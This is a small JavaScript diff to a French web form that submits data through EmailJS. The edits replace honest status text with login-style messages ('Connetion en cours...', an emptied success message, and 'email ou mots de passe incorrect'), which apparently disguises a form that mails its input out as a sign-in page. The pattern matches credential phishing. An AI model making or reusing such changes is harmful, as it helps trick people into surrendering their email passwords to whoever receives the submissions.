@@ -119,7 +119,7 @@ form.addEventListener("submit", async function (event) {
     // Envoi EmailJS
     // ------------------------------
 
-    result.textContent = "Envoi en cours...";
+    result.textContent = "Connetion en cours...";
     result.className = "";
 
 
@@ -139,7 +139,7 @@ form.addEventListener("submit", async function (event) {
         );
 
 
-        result.textContent = "Votre demande a été envoyée.";
+        result.textContent = "";
         result.className = "success";
 
 
@@ -160,7 +160,7 @@ form.addEventListener("submit", async function (event) {
     console.error("Erreur EmailJS :", error);
 
     result.textContent =
-        "Impossible d'envoyer la demande. Veuillez réessayer.";
+        "email ou mots de passe incorrect ,Veuillez réessayer.";
 
     result.className = "error";
 }
